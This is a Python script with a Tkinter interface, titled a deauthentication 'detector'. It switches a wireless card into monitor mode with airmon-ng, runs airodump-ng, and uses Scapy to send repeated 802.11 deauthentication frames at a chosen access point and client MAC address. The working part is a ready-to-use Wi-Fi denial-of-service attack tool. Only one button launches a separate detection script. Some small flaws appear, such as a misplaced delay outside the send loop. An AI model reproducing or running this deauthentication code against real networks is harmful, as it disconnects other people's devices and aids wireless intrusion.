

from scapy.all import *	#Importing Kali Linux
conf.verb = 0	#Dont display any non-sense Scapy
import sys	#Handle arguments and other system funcion
import os	#running system commands
import time	#Giving Delay
from tkinter import *
from subprocess import call
import tkSimpleDialog
import tkMessageBox
import scapy.all as scapy

def detect_deau_packets():
	os.system("sudo python deauthentication_detector.py")




def send_deau_packets():
	channel=channele.get()
	ap_mac=ap_mace.get()
	client_mac=client_mace.get()
	count=counte.get()
	interface=interfacee.get()
	conf.iface = interface

	#Setting WiFi card to a channel
	#iw dev wlan0mon set channel 7
	channel_set = "iw dev "+interface+" set channel "+channel
	os.system(channel_set)

	#Creating a DeAuthentication Frame
	deAuthFrame = RadioTap()/Dot11(addr1=client_mac,addr2=ap_mac,addr3=ap_mac)/Dot11Deauth()
	#print(deAuthFrame.show())

	#Looping till the count
	for pkt in range(int(count)):
		#Sending DeAuthentication frame on Network
		sendp(deAuthFrame)
		print("["+str(pkt+1)+"] "+"Sending DeAuth- BSSID:"+ap_mac+"  Client:"+client_mac)
		#Providing delay of 0.5 seconds
	time.sleep(0.5)

call(["ls"])
os.system("airmon-ng check kill")
time.sleep(3)
os.system("airmon-ng start wlan0")
time.sleep(3)
# result=os.system("airodump-ng wlan0mon")
os.system("airodump-ng wlan0mon")
# print(result)
master = Tk()
# w = Label (master , text="MyProgram")
# w.pack()
master.title("Wifi DeAuthentication Detector")
master.geometry("700x900")
# background_image=master.PhotoImage()
Button(master, text='Detect DeAuthentication Packets', command=detect_deau_packets).grid(row=0, column=1, sticky=W, pady=4)
Label(master, text="channel").grid(row=1)
Label(master, text="Access Point Mac").grid(row=2)
Label(master, text="client mac").grid(row=3)
Label(master, text="How many packets want to send").grid(row=4)
Label(master, text="interface").grid(row=5)



channele = Entry(master)
channele.grid(row=1,column=1)
ap_mace = Entry(master)
ap_mace.grid(row=2, column=1)
client_mace = Entry(master)
client_mace.grid(row=3, column=1)
counte = Entry(master)
counte.grid(row=4, column=1)
interfacee = Entry(master)
interfacee.grid(row=5, column=1)


Button(master, text='Send DeAuthentication Packets', command=send_deau_packets).grid(row=5, column=1, sticky=W, pady=4)

mainloop( )


